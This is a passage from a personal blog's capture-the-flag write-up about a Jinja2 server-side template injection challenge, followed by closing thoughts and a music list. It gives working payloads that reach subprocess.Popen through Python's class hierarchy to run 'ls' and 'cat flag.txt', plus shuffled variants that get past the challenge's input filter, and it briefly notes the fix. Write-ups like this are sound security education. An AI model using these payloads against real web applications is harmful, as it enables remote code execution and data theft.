+<p>Now that we can predictably inject code, now we need to decide on an input. Poking around <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti">Hacktricks Jinja2 SSTI page</a>, it looks like it is possible to access all the functions that the python interpreter has access to using the payload <code class="language-plaintext highlighter-rouge">\{\{ dict.__base__.__subclasses__() }}</code>. To my understanding, <code class="language-plaintext highlighter-rouge">dict</code> is a child class of some generic class, who’s children is absolutely every other class in python. Injecting this using the payload <code class="language-plaintext highlighter-rouge">\{_)_utc\{(scas____bl_i.se\}e}dsb.as_</code> returns a massive list of class that we have at our disposal, including <code class="language-plaintext highlighter-rouge">subprocess.Popen</code>, which allows for remote code execution:
+<img src="assets/images/blog/week9/all-classes.png" alt="assets/images/blog/week9/all-classes.png" /></p>
+
+<p>We can take this string and use a python interpreter to get how many items are in it:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">string</span> <span class="o">=</span> <span class="s">"[&lt;class 'type'&gt;, &lt;class 'async_generator'&gt;]..."</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">classes</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">","</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">classes</span><span class="p">)</span>
+<span class="mi">551</span>
+</code></pre></div></div>
+
+<p>Luckily, <code class="language-plaintext highlighter-rouge">subprocess.Popen</code> is the last class in the array, so we can construct a simple payload to access it, run a command, and return the output:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\<span class="p">{</span>\<span class="p">{</span><span class="nb">dict</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">550</span><span class="p">](</span><span class="s">'ls'</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">).</span><span class="n">communicate</span><span class="p">()}}</span>
+</code></pre></div></div>
+
+<p>Shuffled, this is the payload <code class="language-plaintext highlighter-rouge">5_c0e)sssde_.'._]muthrlsc[_u'_Tt)(-=oecs,bdu{n,bs}ia_}l({o1_sitsme_c.e=)utaa(5ll</code>. Executing this payload returns a successful execution!
+<img src="assets/images/blog/week9/successful-popen.png" alt="assets/images/blog/week9/successful-popen.png" /></p>
+
+<p>Let’s cat out that flag.txt file by modifying the payload:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\<span class="p">{</span>\<span class="p">{</span><span class="nb">dict</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">550</span><span class="p">](</span><span class="s">'cat flag.txt'</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">).</span><span class="n">communicate</span><span class="p">()}}</span>
+</code></pre></div></div>
+
+<p>Resulting in a final payload of <code class="language-plaintext highlighter-rouge">x_('])_\{\{o_t)l5',o=cuc_blg.mhdea1(.lcsctT_duin.ca\}eas\})_tb=ftitamel[-rsssuu_.0ea,(5s_tste </code>:
+<img src="assets/images/blog/week9/flag.png" alt="assets/images/blog/week9/flag.png" /></p>
+
+<p>To remedy this, don’t allow user input to be interpolated into a template, and if that is necessary, sanitize the data before it is used and after it is preprocessed.</p>
+<h2 id="final-thoughts">Final Thoughts</h2>
+<p>I didn’t have time to tackle some of the more interesting rev and pwn challenges, but I was still impressed by the caliber of challenges. The 3 I did seemed perfectly engineered to teach a single concept, which is often difficult to do. I might <del>steal</del> take inspiration from the source code for future challenges. I hope I can devote more time to this challenge next year!</p>
+<h2 id="music-ive-listened-to-this-week">Music I’ve Listened to This Week:</h2>
+<ul>
+  <li><a href="https://open.spotify.com/album/3A1vnUJDPz0xYMful9pO4I?si=Asy_E0SkQdGxnjhOr8H50Q">Atrocity Exhibition - Danny Brown</a></li>
+  <li><a href="https://open.spotify.com/track/52ylRHT88HVcIsVJ6AmetJ?si=719a58d7b8984476">يا حياة قلبي - Haifa Wehbe</a></li>
+  <li><a href="https://open.spotify.com/album/5ra51AaWF3iVebyhlZ1aqq?si=KyZLLgCGTXek2-wv4LN9EA">1999 - Joey Bada$$</a></li>
+</ul>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2024&nbsp;Jake Mullins
+          &nbsp;
+          •
+          &nbsp;Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>
+        </div>
+      </div>
+    </main></body>
+</html>
